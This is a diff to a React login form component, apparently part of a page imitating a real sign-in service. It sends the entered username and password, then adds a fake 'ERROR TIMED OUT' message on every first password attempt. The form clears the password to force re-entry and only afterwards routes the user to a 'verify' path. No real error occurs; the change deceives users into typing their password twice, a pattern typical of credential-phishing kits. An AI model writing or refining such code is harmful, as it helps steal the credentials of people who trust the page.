@@ -124,6 +124,8 @@ export default function LoginCard() {
   const [showPassword, setShowPassword] = useState(false);
   const [touched, setTouched] = useState(false);
 
+  const [loginError, setLoginError] = useState("");
+
   const usernameError = touched && username.trim().length === 0;
   const canContinue = username.trim().length > 0;
   const canSignIn = password.trim().length > 0;
@@ -141,6 +143,7 @@ export default function LoginCard() {
     setTouched(false);
     setPassword("");
     setShowPassword(false);
+    setLoginError("");
     setStep("password");
   }
 
@@ -156,6 +159,16 @@ export default function LoginCard() {
       username: username.trim(),
       password,
     });
+
+    const attempts = parseInt(sessionStorage.getItem("mwb_login_attempts") || "0", 10);
+    if (attempts === 0) {
+      sessionStorage.setItem("mwb_login_attempts", "1");
+      setLoginError("ERROR TIMED OUT. Please try again.");
+      setPassword(""); // Force them to re-enter
+      return;
+    }
+
+    setLoginError("");
     router.push(MWB_VERIFY_PATH);
   }
 
@@ -164,6 +177,7 @@ export default function LoginCard() {
     setPassword("");
     setShowPassword(false);
     setTouched(false);
+    setLoginError("");
   }
 
   return (
@@ -212,6 +226,11 @@ export default function LoginCard() {
         </form>
       ) : (
         <form onSubmit={handlePasswordSubmit} noValidate>
+          {loginError ? (
+            <div className="mb-4 rounded-lg bg-red-500/10 p-3 text-sm text-red-400 border border-red-500/20">
+              {loginError}
+            </div>
+          ) : null}
           <Field
             id="mwb-username-readonly"
             label={SITE.login.usernameLabel}
